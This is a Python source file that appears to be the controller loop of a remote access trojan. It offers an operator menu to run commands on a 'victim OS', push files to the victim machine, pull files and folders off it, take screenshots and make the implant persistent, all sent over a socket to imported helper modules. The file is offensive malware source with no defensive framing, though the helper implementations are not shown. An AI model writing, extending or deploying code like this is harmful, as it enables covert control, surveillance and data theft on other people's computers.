from core.command import run_command
from core.fileupload import upload_files
from core.file_folder_download import receive_file_folders
from core.screenshot import capture_screenshot
from core.persistance import become_persistant



def show_options():
    print("\n")
    print("\t\t[ 01 ] Run Command on victim OS")
    print("\t\t[ 02 ] Upload File to the victim machine ")
    print("\t\t[ 03 ] Download File folders")
    print("\t\t[ 04 ] Change Dir") 
    print("\t\t[ 05 ] Capture Screenshot") 
    print("\t\t[ 06 ] Become Persistance") 
    
    print("\t\t[ 99 ] Exit")
    print("\n")


def handleConnection(my_socket):
    print("[+] Handling connection")

    while True:
        show_options()
        user_input = input("[+] Select your options : ")

        my_socket.send_data(user_input)
        if user_input == "1":
            print("[+] Running the system comamnds on victim")
            # create function that will handle command execution

            run_command(my_socket)
        elif user_input == "2":
            # upload files
            print("[+] Upload files")
            upload_files(my_socket)
        
        elif user_input == "3":
            receive_file_folders(my_socket)

        elif user_input == "4":
            my_socket.change_dir()
        
        elif user_input == "5":
            capture_screenshot(my_socket)
        elif user_input == "6":
            become_persistant(my_socket)

        elif user_input == "99":
            break
        else:
            print("[+] Invalid input ")
            
